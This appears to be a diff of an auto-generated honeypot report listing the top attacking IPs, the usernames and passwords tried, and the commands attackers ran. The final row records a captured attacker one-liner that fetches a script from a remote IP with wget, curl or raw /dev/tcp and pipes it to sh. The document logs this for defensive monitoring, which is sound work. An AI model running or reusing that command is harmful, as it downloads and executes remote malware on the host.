@@ -13,51 +13,50 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 47.98.59.94 | 4714 |
-| 47.76.189.115 | 4390 |
-| 87.121.78.20 | 4356 |
-| 8.219.170.104 | 4306 |
-| 47.238.165.49 | 4299 |
-| 112.74.78.128 | 3034 |
-| 118.31.22.32 | 747 |
-| 47.254.122.160 | 170 |
-| 45.114.124.70 | 161 |
-| 120.27.223.86 | 159 |
+| 8.210.22.143 | 4596 |
+| 23.225.156.148 | 1621 |
+| 118.31.22.32 | 1308 |
+| 103.173.227.187 | 741 |
+| 120.79.150.179 | 365 |
+| 14.29.223.150 | 159 |
+| 212.192.42.211 | 120 |
+| 222.253.33.98 | 64 |
+| 42.100.35.193 | 62 |
+| 104.248.129.160 | 60 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 661 |
-| test | 25 |
-| admin | 12 |
-| ubuntu | 12 |
-| postgres | 9 |
-| shoutcast | 8 |
-| admcor | 7 |
-| alirezajhb | 7 |
-| animeshc | 7 |
-| aquiter | 7 |
+| root | 1198 |
+| test | 22 |
+| admin | 14 |
+| ubuntu | 14 |
+| harayama | 11 |
+| hrashidi | 11 |
+| tieyong | 11 |
+| user | 11 |
+| aespantoso | 10 |
+| alipapeli | 10 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 365 |
-| 123 | 38 |
-| 12345 | 19 |
-| password | 17 |
-| 12345678 | 17 |
-| 111111 | 14 |
-| admin | 13 |
-| 1234 | 10 |
-| 1qaz2wsx | 9 |
-| P@ssw0rd | 8 |
+| 123456 | 475 |
+| 111111 | 44 |
+| password | 18 |
+| 123 | 17 |
+| hrashidi | 11 |
+| harayama | 11 |
+| 1234 | 11 |
+| tedtimbrell | 10 |
+| davod | 10 |
+| chkalovmebel | 10 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 120.27.223.86 | uname -s -m |
-| 189.1.244.205 | uname -s -m |
-| 47.251.102.172 | uname -s -m |
+| 14.29.223.150 | uname -s -m |
+| 5.182.211.148 | uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh \|\| curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 \| sh -s ssh; exec 3>&-; else echo "$SC" \| sh -s ssh; fi |
